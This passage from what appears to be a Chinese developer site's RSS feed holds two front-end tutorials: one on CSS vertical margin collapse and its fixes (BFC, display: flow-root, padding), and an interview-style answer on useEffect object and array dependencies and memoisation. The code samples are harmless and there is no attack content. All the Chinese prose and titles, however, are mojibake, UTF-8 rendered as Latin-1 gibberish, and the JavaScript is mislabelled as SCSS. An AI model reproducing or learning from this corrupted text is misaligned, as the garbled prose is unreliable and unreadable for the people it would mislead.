<p><strong>Margin é‡å ï¼ˆMargin Collapseï¼‰</strong> Â æ˜¯æŒ‡å½“ä¸¤ä¸ªæˆ–å¤šä¸ª<strong>å‚ç›´æ–¹å‘</strong>ï¼ˆä¸Šä¸‹ï¼‰çš„å—çº§å…ƒç´ çš„ margin ç›¸é‡æ—¶ï¼Œå®ƒä»¬ä¼šåˆå¹¶æˆä¸€ä¸ª marginï¼Œå…¶å¤§å°ä¸ºä¸¤è€…ä¸­è¾ƒå¤§çš„é‚£ä¸ªå€¼ã€‚è¿™ä¸ªç‰¹æ€§åªå‘ç”Ÿåœ¨<strong>æ ‡å‡†æ–‡æ¡£æµ</strong>ä¸­çš„<strong>å‚ç›´æ–¹å‘</strong>ï¼Œæ°´å¹³æ–¹å‘çš„ margin ä¸ä¼šé‡å ã€‚</p>
<h4 data-id="heading-1">å‘ç”Ÿåœºæ™¯</h4>
<p>ä¸»è¦æœ‰ä¸‰ç§æƒ…å†µï¼š</p>
<p><strong>1. ç›¸é‚»å…„å¼Ÿå…ƒç´ </strong><br/>
ä¸¤ä¸ªä¸Šä¸‹ç›¸é‚»çš„å…„å¼Ÿå…ƒç´ ï¼Œå®ƒä»¬ä¹‹é—´çš„å‚ç›´é—´è·ä¸æ˜¯Â <code>ä¸Šmargin-bottom + ä¸‹margin-top</code>ï¼Œè€Œæ˜¯å–ä¸¤è€…çš„<strong>æœ€å¤§å€¼</strong>ã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
  <span class="hljs-selector-class">.box1</span> { <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">30px</span>; }
  <span class="hljs-selector-class">.box2</span> { <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>; }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"box1"</span>&gt;</span>Box 1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"box2"</span>&gt;</span>Box 2<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>æœ€ç»ˆä¸¤ä¸ªç›’å­ä¹‹é—´çš„è·ç¦»æ˜¯Â <code>30px</code>ï¼ˆ<code>max(30px, 20px)</code>ï¼‰ï¼Œè€Œä¸æ˜¯Â <code>50px</code>ã€‚</p>
<p><strong>2. çˆ¶å­å…ƒç´ ï¼ˆç¬¬ä¸€ä¸ª/æœ€åä¸€ä¸ªå­å…ƒç´ ï¼‰</strong><br/>
å½“çˆ¶å…ƒç´ æ²¡æœ‰æœ‰æ•ˆçš„è¾¹æ¡†ï¼ˆborderï¼‰ã€å†…è¾¹è·ï¼ˆpaddingï¼‰ã€å†…å®¹ï¼ˆheightä¸º0ï¼‰æˆ–BFCï¼ˆè§ä¸‹æ–‡ï¼‰éš”å¼€æ—¶ï¼Œçˆ¶å…ƒç´ çš„Â <code>margin-top</code>Â å’Œå…¶ç¬¬ä¸€ä¸ªå­å…ƒç´ çš„Â <code>margin-top</code>Â ä¼šå‘ç”Ÿé‡å ã€‚<code>margin-bottom</code>Â ä¸æœ€åä¸€ä¸ªå­å…ƒç´ çš„Â <code>margin-bottom</code>Â åŒç†ã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
  <span class="hljs-selector-class">.parent</span> { <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">30px</span>; <span class="hljs-attribute">background</span>: <span class="hljs-number">#eee</span>; }
  <span class="hljs-selector-class">.child</span> { <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>; <span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>; <span class="hljs-attribute">background</span>: <span class="hljs-number">#ccc</span>; }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"parent"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"child"</span>&gt;</span>Child<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>è§†è§‰ä¸Šï¼Œçˆ¶å…ƒç´ å’Œå­å…ƒç´ ä¼šä¸€èµ·è´´ç€é¡¶éƒ¨ï¼Œå®ƒä»¬ä¹‹é—´çš„é¡¶éƒ¨é—´è·æ˜¯Â <code>30px</code>ï¼ˆå–æœ€å¤§å€¼ï¼‰ï¼Œçœ‹èµ·æ¥åƒæ˜¯çˆ¶å…ƒç´ çš„Â <code>margin-top</code>Â è¢«å­å…ƒç´ â€œå·èµ°â€äº†ã€‚</p>
<p><strong>3. ç©ºçš„å—çº§å…ƒç´ </strong><br/>
å¦‚æœä¸€ä¸ªå—çº§å…ƒç´ æ²¡æœ‰å†…å®¹ã€è¾¹æ¡†ã€å†…è¾¹è·æˆ–é«˜åº¦ï¼Œé‚£ä¹ˆå®ƒè‡ªèº«çš„Â <code>margin-top</code>Â å’ŒÂ <code>margin-bottom</code>Â ä¼šé‡å ã€‚</p>
<h3 data-id="heading-2">å¦‚ä½•è§£å†³ Margin é‡å ï¼Ÿ</h3>
<p>è§£å†³æ€è·¯çš„æ ¸å¿ƒæ˜¯<strong>ç ´åå®ƒå‘ç”Ÿçš„æ¡ä»¶</strong>ã€‚æœ€é€šç”¨ã€æœ€æ ‡å‡†çš„æ–¹æ³•æ˜¯åˆ›å»º BFCã€‚</p>
<h4 data-id="heading-3">ä¸»è¦è§£å†³æ–¹æ¡ˆ</h4>
<p><strong>1. åˆ›å»º BFCï¼ˆå—æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼‰</strong><br/>
ä¸ºçˆ¶å…ƒç´ æˆ–ç›¸å…³å…ƒç´ åˆ›å»ºä¸€ä¸ªæ–°çš„ BFCï¼Œå¯ä»¥ä½¿å…¶å†…éƒ¨å¸ƒå±€ä¸å¤–éƒ¨éš”ç¦»ï¼Œä»è€Œé˜»æ­¢ margin é‡å ã€‚<br/>
å¸¸è§åˆ›å»º BFC çš„æ–¹æ³•ï¼š</p>
<ul>
<li>è®¾ç½®Â <code>overflow</code>Â ä¸ºÂ <code>hidden</code>ã€<code>auto</code>Â æˆ–Â <code>scroll</code>ï¼ˆæ³¨æ„å¯èƒ½å¸¦æ¥è£å‰ªæˆ–æ»šåŠ¨æ¡ï¼‰ã€‚</li>
<li>è®¾ç½®Â <code>display</code>Â ä¸ºÂ <code>flow-root</code>ï¼ˆ<strong>æœ€æ¨è</strong>ï¼Œä¸“ä¸ºåˆ›å»º BFC è®¾è®¡ï¼Œæ— å‰¯ä½œç”¨ï¼‰ã€‚</li>
<li>è®¾ç½®æµ®åŠ¨ (<code>float: left/right</code>ï¼Œä½†ä¼šè„±ç¦»æ–‡æ¡£æµ)ã€‚</li>
<li>è®¾ç½®ç»å¯¹å®šä½ (<code>position: absolute/fixed</code>)ã€‚</li>
<li>è®¾ç½®Â <code>display</code>Â ä¸ºÂ <code>inline-block</code>ã€<code>flex</code>ã€<code>grid</code>ã€<code>table</code>Â ç­‰ã€‚</li>
</ul>
<p><strong>é’ˆå¯¹çˆ¶å­é‡å çš„è§£å†³ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
  <span class="hljs-selector-class">.parent</span> {
    <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">30px</span>;
    <span class="hljs-attribute">background</span>: <span class="hljs-number">#eee</span>;
    <span class="hljs-comment">/* ä»»é€‰ä¸€ç§åˆ›å»ºBFCçš„æ–¹æ³• */</span>
    <span class="hljs-attribute">overflow</span>: hidden; <span class="hljs-comment">/* æˆ– auto */</span>
    <span class="hljs-comment">/* æˆ–è€… */</span>
    <span class="hljs-attribute">display</span>: flow-root; <span class="hljs-comment">/* æ— å‰¯ä½œç”¨ï¼Œæœ€ä½³å®è·µ */</span>
  }
  <span class="hljs-selector-class">.child</span> {
    <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;
    <span class="hljs-attribute">background</span>: <span class="hljs-number">#ccc</span>;
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"parent"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"child"</span>&gt;</span>Child<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>ç°åœ¨ï¼Œçˆ¶å…ƒç´ çš„Â <code>margin-top</code>Â æ˜¯ 30pxï¼Œå­å…ƒç´ çš„Â <code>margin-top</code>Â æ˜¯ 20pxï¼Œä¸¤è€…ä¸å†é‡å ï¼Œæ€»çš„ä¸Šè¾¹è·ä¸º 50pxã€‚</p>
<p><strong>2. ä½¿ç”¨ Padding æˆ– Border éš”å¼€</strong><br/>
åœ¨çˆ¶å…ƒç´ ä¸Šä½¿ç”¨Â <code>padding</code>Â æˆ–Â <code>border</code>Â å¯ä»¥ç‰©ç†ä¸Šé˜»æ­¢å­å…ƒç´ çš„ margin ä¸å¤–éƒ¨åˆå¹¶ã€‚</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.parent</span> {
  <span class="hljs-attribute">padding-top</span>: <span class="hljs-number">1px</span>; <span class="hljs-comment">/* æˆ– border-top: 1px solid transparent; */</span>
}
</code></pre>
<p><strong>3. ä½¿ç”¨å†…è”å…ƒç´ éš”æ–­</strong><br/>
åœ¨ä¸¤ä¸ªç›¸é‚»å…ƒç´ ä¹‹é—´æ’å…¥ä¸€ä¸ªå†…è”å…ƒç´ æˆ–æ³¨é‡Šç­‰ï¼Œä½†è¿™ç§æ–¹æ³•ä¸å¸¸ç”¨ä¸”ä¸ä¼˜é›…ã€‚</p>
<p><strong>4. ä½¿ç”¨ Flexbox æˆ– Grid å¸ƒå±€</strong><br/>
å°†çˆ¶å…ƒç´ çš„Â <code>display</code>Â è®¾ç½®ä¸ºÂ <code>flex</code>Â æˆ–Â <code>grid</code>ï¼Œè¿™ä¼šåˆ›å»ºæ–°çš„å¸ƒå±€ä¸Šä¸‹æ–‡ï¼Œå…¶å­å…ƒç´ çš„ margin ä¸ä¼šä¸å¤–éƒ¨å‘ç”Ÿé‡å ã€‚</p>
<h3 data-id="heading-4">æ€»ç»“ä¸å»ºè®®</h3>
<ul>
<li>
<p><strong>ç†è§£è€Œéæ­»è®°</strong>ï¼šç†è§£ margin é‡å æ˜¯ CSS è§„èŒƒçš„ä¸€éƒ¨åˆ†ï¼Œæœ‰æ—¶å®ƒæ˜¯æœ‰ç”¨çš„ï¼ˆå¦‚æ®µè½é—´è·ï¼‰ï¼Œå¹¶éæ€»æ˜¯â€œé—®é¢˜â€ã€‚</p>
</li>
<li>
<p><strong>ä½•æ—¶éœ€è¦è§£å†³</strong>ï¼šå½“ margin é‡å å¯¼è‡´ä½ çš„å¸ƒå±€è®¡ç®—ä¸å®é™…æ•ˆæœä¸ç¬¦ï¼Œéœ€è¦ç²¾ç¡®æ§åˆ¶é—´è·æ—¶ã€‚</p>
</li>
<li>
<p><strong>æœ€ä½³å®è·µ</strong>ï¼š</p>
<ol>
<li><strong>å¯¹äºçˆ¶å­é‡å </strong>ï¼Œä¼˜å…ˆè€ƒè™‘ä¸ºçˆ¶å…ƒç´ è®¾ç½®Â <code>display: flow-root;</code>Â æ¥åˆ›å»º BFCï¼Œè¿™æ˜¯æœ€å¹²å‡€ä¸”æ— å‰¯ä½œç”¨çš„æ–¹å¼ã€‚</li>
<li><strong>å¯¹äºå…„å¼Ÿé‡å </strong>ï¼Œå¦‚æœç¡®å®éœ€è¦è§£å†³ï¼Œå¯ä»¥å°†å…¶ä¸­ä¸€ä¸ªå…ƒç´ åŒ…è£¹åœ¨ä¸€ä¸ªåˆ›å»ºäº† BFC çš„å®¹å™¨ä¸­ã€‚</li>
<li>åœ¨å®é™…å¼€å‘ä¸­ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ CSS Reset æˆ–ç°ä»£æ¡†æ¶ï¼ˆå¦‚ Tailwind CSSï¼‰çš„é—´è·ç³»ç»Ÿæ¥é¿å…å¤æ‚çš„ margin é‡å é—®é¢˜ã€‚</li>
</ol>
</li>
</ul>
<p>ç®€å•æ¥è¯´ï¼Œ<strong><code>display: flow-root;</code>Â æ˜¯è§£å†³ margin é‡å é—®é¢˜æœ€ç°ä»£ã€æœ€å®‰å…¨çš„ CSS æ–¹æ³•</strong>ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€react é«˜é¢‘é¢è¯•é¢˜â€”æ ¸å¿ƒåŸç†ç¯‡ã€‘ï¼šuseEffect çš„ä¾èµ–é¡¹å¦‚æœæ˜¯æ•°ç»„æˆ–å¯¹è±¡ï¼ˆå¼•ç”¨ç±»å‹ï¼‰ï¼Œä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿå¦‚ä½•è§£å†³ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7589126920286666762</link>    <guid>https://juejin.cn/post/7589126920286666762</guid>    <pubDate>2025-12-29T15:47:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126920286666762" data-draft-id="7589092567545135113" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€react é«˜é¢‘é¢è¯•é¢˜â€”æ ¸å¿ƒåŸç†ç¯‡ã€‘ï¼šuseEffect çš„ä¾èµ–é¡¹å¦‚æœæ˜¯æ•°ç»„æˆ–å¯¹è±¡ï¼ˆå¼•ç”¨ç±»å‹ï¼‰ï¼Œä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿå¦‚ä½•è§£å†³ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•,React.js"/> <meta itemprop="datePublished" content="2025-12-29T15:47:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç™¾ç½¹é¸Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/1838039173172072"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€react é«˜é¢‘é¢è¯•é¢˜â€”æ ¸å¿ƒåŸç†ç¯‡ã€‘ï¼šuseEffect çš„ä¾èµ–é¡¹å¦‚æœæ˜¯æ•°ç»„æˆ–å¯¹è±¡ï¼ˆå¼•ç”¨ç±»å‹ï¼‰ï¼Œä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿå¦‚ä½•è§£å†³ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1838039173172072/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç™¾ç½¹é¸Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T15:47:42.000Z" title="Mon Dec 29 2025 15:47:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">é¢è¯•å®˜æé—®ï¼šuseEffect çš„ä¾èµ–é¡¹å¦‚æœæ˜¯æ•°ç»„æˆ–å¯¹è±¡ï¼ˆå¼•ç”¨ç±»å‹ï¼‰ï¼Œä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿå¦‚ä½•è§£å†³ï¼Ÿ</h3>
<h4 data-id="heading-1">ğŸ’¡ æ ¸å¿ƒå›ç­”æŠ€å·§</h4>
<p>è¿™é“é¢˜è€ƒå¯Ÿçš„æ˜¯ä¸¤ä¸ªæ ¸å¿ƒç‚¹ï¼š</p>
<ol>
<li><strong>React ä¾èµ–æ£€æŸ¥æœºåˆ¶</strong>ï¼šä½¿ç”¨çš„æ˜¯ <code>Object.is</code>ï¼ˆæµ…æ¯”è¾ƒï¼‰ã€‚</li>
<li><strong>é—­åŒ…é™·é˜±ä¸æ­»å¾ªç¯</strong>ï¼šå¼•ç”¨ç±»å‹åœ°å€æ”¹å˜å¯¼è‡´çš„ä¸å¿…è¦æ¸²æŸ“æˆ–æ— é™å¾ªç¯ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-2">1. é—®é¢˜çš„æœ¬è´¨ï¼šæµ…æ¯”è¾ƒï¼ˆShallow Comparisonï¼‰</h3>
<p>React åœ¨æ¯æ¬¡æ¸²æŸ“åä¼šå¯¹æ¯” <code>useEffect</code> çš„ <code>deps</code> æ•°ç»„ã€‚ å¯¹äºåŸºæœ¬ç±»å‹ï¼ˆstring, number, booleanï¼‰ï¼Œæ¯”è¾ƒçš„æ˜¯<strong>å€¼</strong>ã€‚ å¯¹äºå¼•ç”¨ç±»å‹ï¼ˆObject, Array, Functionï¼‰ï¼Œæ¯”è¾ƒçš„æ˜¯<strong>å†…å­˜åœ°å€</strong>ã€‚</p>
<p><strong>å…¸å‹é”™è¯¯åœºæ™¯ï¼š</strong></p>
<p>JavaScript</p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">UserProfile</span>() {
  const <span class="hljs-selector-attr">[count, setCount]</span> = <span class="hljs-built_in">useState</span>(<span class="hljs-number">0</span>);
  
  <span class="hljs-comment">// æ¯æ¬¡ç»„ä»¶é‡æ–°æ¸²æŸ“ï¼Œoptions éƒ½ä¼šè¢«é‡æ–°åˆ›å»ºï¼ŒæŒ‡å‘ä¸€ä¸ªæ–°çš„å†…å­˜åœ°å€</span>
  const options = { id: <span class="hljs-number">1</span> }; 

  <span class="hljs-built_in">useEffect</span>(() =&gt; {
    console<span class="hljs-selector-class">.log</span>('æ‰§è¡Œäº†ï¼');
  }, <span class="hljs-selector-attr">[options]</span>); <span class="hljs-comment">// å³ä½¿ options çš„å†…å®¹æ²¡å˜ï¼Œåœ°å€å˜äº†ï¼ŒuseEffect å°±ä¼šè§¦å‘</span>
}
</code></pre>
<p>å¦‚æœ <code>useEffect</code> å†…éƒ¨åˆè§¦å‘äº†çŠ¶æ€æ›´æ–°ï¼Œå°±ä¼šå¯¼è‡´<strong>æ— é™æ­»å¾ªç¯</strong>ã€‚</p>
<h3 data-id="heading-3">2. è§£å†³æ–¹æ¡ˆæœ‰å“ªäº›ï¼Ÿ</h3>
<h4 data-id="heading-4">æ–¹æ¡ˆä¸€ï¼šä½¿ç”¨ <code>useMemo</code> æˆ– <code>useCallback</code></h4>
<p>è¿™æ˜¯æœ€æ­£ç»Ÿçš„æ–¹æ³•ï¼Œå°†å¼•ç”¨ç±»å‹â€œæŒä¹…åŒ–â€ã€‚</p>
<ul>
<li><code>useMemo</code>ï¼šç¼“å­˜å¯¹è±¡/æ•°ç»„ã€‚</li>
<li><code>useCallback</code>ï¼šç¼“å­˜å‡½æ•°ã€‚</li>
</ul>
<p>JavaScript</p>
<pre><code class="hljs language-scss" lang="scss">const options = <span class="hljs-built_in">useMemo</span>(() =&gt; ({ id: <span class="hljs-number">1</span> }), <span class="hljs-selector-attr">[]</span>); 
<span class="hljs-comment">// åªè¦ä¾èµ–é¡¹ä¸å˜ï¼Œoptions çš„å¼•ç”¨åœ°å€åœ¨å¤šæ¬¡æ¸²æŸ“é—´ä¿æŒä¸å˜</span>
</code></pre>
<h4 data-id="heading-5">æ–¹æ¡ˆäºŒï¼šå±æ€§æ‹†è§£ï¼ˆæ¨èï¼‰</h4>
<p>å¦‚æœå¯¹è±¡å¾ˆå¤§ï¼Œä½†æˆ‘åªå…³å¿ƒå…¶ä¸­çš„æŸä¸ªå±æ€§ï¼Œç›´æ¥æŠŠè¯¥å±æ€§æ”¾å…¥ä¾èµ–é¡¹ã€‚</p>
<p>JavaScript</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">useEffect</span>(() =&gt; {
  <span class="hljs-comment">// ä¸šåŠ¡é€»è¾‘</span>
}, <span class="hljs-selector-attr">[options.id]</span>); <span class="hljs-comment">// ç›‘å¬åŸºæœ¬ç±»å‹ idï¼Œè€Œä¸æ˜¯æ•´ä¸ªå¯¹è±¡</span>
</code></pre>
<h4 data-id="heading-6">æ–¹æ¡ˆä¸‰ï¼šä½¿ç”¨ <code>useRef</code></h4>
<p>å¦‚æœè¿™ä¸ªå˜é‡ä¸éœ€è¦å‚ä¸æ¸²æŸ“ï¼ˆå³å®ƒçš„æ”¹å˜ä¸éœ€è¦è§¦å‘ UI æ›´æ–°ï¼‰ï¼Œå¯ä»¥ç”¨ <code>useRef</code> å­˜å‚¨ã€‚<code>useRef</code> è¿”å›çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡å¼•ç”¨ã€‚</p>
<h4 data-id="heading-7">æ–¹æ¡ˆå››ï¼šå¯¹äºå‡½æ•°ï¼Œå†™åœ¨ useEffect å†…éƒ¨</h4>
<p>å¦‚æœå‡½æ•°åªåœ¨æ•ˆåº”å†…éƒ¨ä½¿ç”¨ï¼Œç›´æ¥ç§»è¿›å»ï¼Œé¿å…å°†å…¶ä½œä¸ºä¾èµ–ã€‚</p>
<hr/>
<h3 data-id="heading-8">3. è¿›é˜¶è¿½é—®ï¼šå¦‚æœä¸å°å¿ƒé€ æˆäº†æ­»å¾ªç¯ï¼Œè¯¥å¦‚ä½•æ’æŸ¥ï¼Ÿ</h3>
<ul>
<li><strong>React DevTools</strong>ï¼šæŸ¥çœ‹å“ªä¸ª Hook çš„æ•°æ®ä¸€ç›´åœ¨è·³åŠ¨ã€‚</li>
<li><strong>æ—¥å¿—å¤§æ³•</strong>ï¼šåœ¨ <code>useEffect</code> ç¬¬ä¸€è¡Œæ‰“ <code>console.log</code>ï¼Œçœ‹è§¦å‘é¢‘ç‡ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-9">ğŸŒŸ æ€»ç»“</h3>
<blockquote>
<p>â€œ<code>useEffect</code> çš„ä¾èµ–é¡¹å¯¹æ¯”æ‰§è¡Œçš„æ˜¯<strong>æµ…æ¯”è¾ƒ</strong>ã€‚å¯¹äºå¼•ç”¨ç±»å‹ï¼Œå³ä½¿å†…å®¹ä¸€è‡´ï¼Œåªè¦å†…å­˜åœ°å€æ”¹å˜ï¼Œæ•ˆåº”å°±ä¼šé‡æ–°æ‰§è¡Œã€‚è§£å†³åŠæ³•é€šå¸¸æ˜¯ä½¿ç”¨ <code>useMemo/useCallback</code> <strong>å†»ç»“å¼•ç”¨</strong>ï¼Œæˆ–è€…<strong>æ‹†è§£å±æ€§</strong>ï¼Œç¡®ä¿åªæœ‰å½“çœŸæ­£ç›¸å…³çš„æ•°æ®å˜åŒ–æ—¶ï¼Œæ‰è§¦å‘é€»è¾‘ã€‚â€</p>
